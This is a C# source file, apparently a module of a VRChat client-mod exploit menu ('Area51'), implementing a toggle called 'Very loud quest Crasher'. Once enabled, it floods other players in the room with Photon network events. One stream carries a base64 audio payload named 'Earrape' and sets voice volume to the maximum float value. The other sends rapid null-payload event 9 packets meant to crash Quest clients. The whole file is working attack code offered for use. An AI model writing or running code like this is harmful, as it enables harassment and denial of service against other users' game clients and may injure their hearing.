using System;
using System.Collections;
using Area51.SDK;
using Area51.SDK.Photon;
using Area51.SDK.Security;
using ExitGames.Client.Photon;
using MelonLoader;
using Photon.Realtime;
using UnityEngine;
using VRC.SDKBase;

namespace Area51.Module.Exploit
{
	internal class Event9AudioCrash : BaseModule
	{
		public Event9AudioCrash()
			: base("Event 91", "Very loud quest Crasher", Main.Instance.EventQuickMenu, null, isToggle: true)
		{
		}

		public override void OnEnable()
		{
			MelonCoroutines.Start(LOUD());
			MelonCoroutines.Start(EventNine());
			USpeaker.field_Internal_Static_Single_1 = float.MaxValue;
		}

		public override void OnDisable()
		{
			MelonCoroutines.Stop(LOUD());
			USpeaker.field_Internal_Static_Single_1 = 1f;
		}

		private IEnumerator LOUD()
		{
			while (toggled)
			{
				byte[] array = Convert.FromBase64String(SecurityCheck.Earrape);
				byte[] src = new byte[4];
				byte[] bytes = BitConverter.GetBytes(Networking.GetServerTimeInMilliseconds());
				Buffer.BlockCopy(src, 0, array, 0, 4);
				Buffer.BlockCopy(bytes, 0, array, 4, 4);
				for (int i = 0; i < 80; i++)
				{
					PhotonExtensions.OpRaiseEvent(1, array, new RaiseEventOptions
					{
						field_Public_ReceiverGroup_0 = ReceiverGroup.Others,
						field_Public_EventCaching_0 = EventCaching.DoNotCache
					}, default(SendOptions));
				}
				yield return new WaitForSecondsRealtime(1f);
			}
		}

		private IEnumerator EventNine()
		{
			byte[] NullPayload = new byte[8];
			byte[] bytes = BitConverter.GetBytes(int.Parse($"{PlayerWrapper.LocalPlayer.GetActorNumber()}00001"));
			Buffer.BlockCopy(bytes, 0, NullPayload, 0, 4);
			while (toggled)
			{
				for (int i = 0; i < 80; i++)
				{
					PhotonExtensions.OpRaiseEvent(9, NullPayload, new RaiseEventOptions
					{
						field_Public_ReceiverGroup_0 = ReceiverGroup.Others,
						field_Public_EventCaching_0 = EventCaching.DoNotCache
					}, SendOptions.SendReliable);
				}
				yield return new WaitForSecondsRealtime(0.1f);
			}
		}
	}
}
